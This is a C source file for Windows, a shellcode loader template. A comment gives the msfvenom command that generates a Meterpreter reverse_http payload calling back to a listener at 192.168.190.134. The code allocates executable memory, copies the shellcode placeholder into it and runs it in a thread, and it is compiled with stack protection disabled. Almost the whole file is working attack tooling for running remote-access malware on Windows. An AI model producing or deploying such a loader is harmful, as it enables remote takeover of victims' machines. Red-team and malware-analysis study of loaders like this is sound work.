#include <windows.h>
#include <stdio.h>

// compile: cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcnoobfuscation-loader.c /link /out:noobfuscation-loader.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f csharp | tr -d \\n
unsigned char shellcode[] = { ###SHELLCODE### };

int main(void)
{
	void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD op = 0;
	
	// Allocate buffer for shellcode
    exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
    // Copy shellcode to the buffer
    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));

	// Execute shellcode in a thread
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);

    return 0;
}
